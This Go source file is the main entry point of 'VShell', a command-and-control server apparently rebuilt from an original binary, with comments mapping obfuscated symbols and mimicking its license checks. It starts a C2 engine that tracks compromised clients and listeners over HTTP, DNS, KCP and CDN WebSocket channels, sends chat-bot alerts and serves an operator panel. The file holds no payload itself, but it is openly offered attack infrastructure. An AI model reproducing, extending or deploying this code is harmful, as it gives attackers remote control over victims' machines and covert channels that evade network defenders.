package main

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"log"
	"net/http"
	"net/http/pprof"
	"os"
	"os/signal"
	"syscall"

	"vshell/c2engine"
	"vshell/models"
	"vshell/router"
	"vshell/utils"
)

func main() {
	// ========================================================================
	// Step 1: Load configuration from conf/setting.conf
	// ========================================================================
	// This replaces the hardcoded c2engine.DefaultConfig() with values from
	// the config file, matching the original binary's initialization flow.
	cfg := utils.GetFullSettings()
	logCloser, err := utils.ConfigureLogger(cfg)
	if err != nil {
		log.Fatalf("configure logger: %v", err)
	}
	defer logCloser.Close()
	log.Printf("[Config] Loaded from conf/setting.conf (master_type=%s, port=%d)",
		cfg.MasterType, cfg.WebPort)

	// If no password configured (no setting.conf present), generate a random one.
	// No hardcoded default credentials exist in the codebase.
	if cfg.WebPassword == "" {
		b := make([]byte, 8)
		if _, err := rand.Read(b); err != nil {
			log.Fatalf("generate random password: %v", err)
		}
		cfg.WebPassword = hex.EncodeToString(b)
		log.Printf("[Config] No web_password in setting.conf — generated random password: %s", cfg.WebPassword)
	}

	// Sync config into utils.Settings for auth/controller compatibility
	utils.SyncSettingsFromConfig()

	// Build c2engine config from loaded settings
	engineConfig := &c2engine.Config{
		DBPath:       "db/data.db",
		WebPort:      cfg.WebPort,
		WebIP:        cfg.WebIP,
		WebUsername:  cfg.WebUsername,
		WebPassword:  cfg.WebPassword,
		WebJWTSecret: cfg.WebJWTSecret,
		WebTitle:     cfg.WebTitle,
		License:      cfg.License,
	}

	// ========================================================================
	// Step 2: Initialize notification system (DingDing/WeChat bots)
	// ========================================================================
	notifier := utils.GetNotifier()
	notifier.Start()

	// ========================================================================
	// Step 3: Initialize application orchestrator (iVzmssZ.RuWw1_w equivalent)
	// ========================================================================
	app := c2engine.GetApplication()
	if err := app.Init(engineConfig); err != nil {
		log.Printf("Warning: App init had warnings: %v", err)
	}

	// ========================================================================
	// Step 4: Initialize database
	// ========================================================================
	if err := models.InitDB("db/data.db"); err != nil {
		log.Printf("Warning: Database init failed: %v (running without persistence)", err)
	}

	r := router.InitRouter()

	// ========================================================================
	// Step 4.5: pprof debug endpoint (if configured in setting.conf)
	// ========================================================================
	if cfg.PprofIP != "" && cfg.PprofPort > 0 {
		pprofAddr := fmt.Sprintf("%s:%d", cfg.PprofIP, cfg.PprofPort)
		pprofMux := http.NewServeMux()
		pprofMux.HandleFunc("/debug/pprof/", pprof.Index)
		pprofMux.HandleFunc("/debug/pprof/cmdline", pprof.Cmdline)
		pprofMux.HandleFunc("/debug/pprof/profile", pprof.Profile)
		pprofMux.HandleFunc("/debug/pprof/symbol", pprof.Symbol)
		pprofMux.HandleFunc("/debug/pprof/trace", pprof.Trace)

		go func() {
			log.Printf("[Pprof] Debug endpoint listening on %s", pprofAddr)
			if err := http.ListenAndServe(pprofAddr, pprofMux); err != nil {
				log.Printf("[Pprof] Server error: %v", err)
			}
		}()
	}

	// ========================================================================
	// Step 5: Start web panel
	// ========================================================================
	addr := fmt.Sprintf("%s:%d", cfg.WebIP, cfg.WebPort)
	stats := app.GetAppInfo()

	log.Printf("========================================")
	log.Printf("  VShell Management Console v3.0")
	if cfg.WebOpenSSL {
		log.Printf("  URL: https://%s/login", addr)
	} else {
		log.Printf("  URL: http://%s/login", addr)
	}
	log.Printf("  Login: %s / ********", cfg.WebUsername)
	log.Printf("  C2 Engine: %v clients (%v online), %v listeners",
		stats["total_clients"], stats["online_clients"], stats["total_listeners"])
	log.Printf("  Modes: HTTP/HTTPS | DNS | KCP | CDN WebSocket")
	log.Printf("  Transport: TCP | UDP (KCP) | WebSocket")
	if notifier != nil {
		hasDD := cfg.DingdingAccessToken != ""
		hasWX := cfg.WxKey != ""
		if hasDD || hasWX {
			log.Printf("  Notifications: %s%s",
				boolLabel(hasDD, "DingDing"), boolLabel(hasWX, "WeChat"))
		}
	}
	if cfg.PprofPort > 0 {
		log.Printf("  Pprof: http://%s:%d/debug/pprof/", cfg.PprofIP, cfg.PprofPort)
	}

	// Report license status
	licStatus := utils.GetLicenseStatus()
	if licStatus.Valid {
		log.Printf("License OK")
		log.Printf("LicenseName: %s, LicenseTime: %s, Limit Client: %d, LicenseVIP: %v",
			licStatus.Name, licStatus.EndTime, licStatus.MaxClients, licStatus.Advanced)
	} else {
		// Original binary behavior (black-box verified):
		//   invalid license → red "License Invalid" and process exit
		//   empty license  → "Please Input Password:" (online activation prompt)
		if licStatus.Description == "no license, running in evaluation mode" {
			log.Printf("Please Input Password:")
		} else {
			log.Printf("License Invalid")
		}
		log.Fatalf("Invalid license: %s", licStatus.Description)
	}
	log.Printf("========================================")

	// ========================================================================
	// Step 6: Create HTTP server (with optional SSL)
	// ========================================================================
	server := &http.Server{
		Addr:    addr,
		Handler: r,
	}

	// Handle graceful shutdown
	go func() {
		sigCh := make(chan os.Signal, 1)
		signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
		<-sigCh
		log.Println("Shutting down...")
		app.Stop()
		c2engine.GetListenerManager().StopAll()
		server.Close()
	}()

	// Start all background services
	app.StartBackground()

	// ========================================================================
	// Step 7: Start listening (HTTP or HTTPS based on config)
	// ========================================================================
	if cfg.WebOpenSSL && cfg.WebCertFile != "" && cfg.WebKeyFile != "" {
		if err := server.ListenAndServeTLS(cfg.WebCertFile, cfg.WebKeyFile); err != nil && err != http.ErrServerClosed {
			log.Fatalf("Server failed: %v", err)
		}
	} else {
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Fatalf("Server failed: %v", err)
		}
	}
}

func boolLabel(cond bool, label string) string {
	if cond {
		return " " + label
	}
	return ""
}
